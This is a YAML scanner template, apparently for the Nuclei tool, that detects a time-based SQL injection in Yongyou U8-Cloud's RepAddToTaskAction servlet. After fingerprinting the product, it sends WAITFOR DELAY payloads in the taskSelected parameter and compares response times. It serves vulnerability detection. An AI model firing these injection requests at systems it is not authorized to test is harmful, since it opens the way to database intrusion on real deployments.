id: yongyou-u8-cloud-repaddtotaskaction-sqli
info:
  name: "用友U8-Cloud RepAddToTaskAction SQL注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: yongyou-u8-cloud
  metadata:
    fingerprint: Yongyou U8cloud

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "U8C"
      - type: status
        status:
          - 200

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:5%27--"
      - "{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.RepAddToTaskAction&method=save&taskSelected=1%27);WAITFOR+DELAY+%270:0:8%27--"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "正在执行... - iUFO"
          - "系统正在处理请求"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: response-delay
        group: 0
        regex:
          - "正在执行.*"  # Example regex to extract matching content from response body.
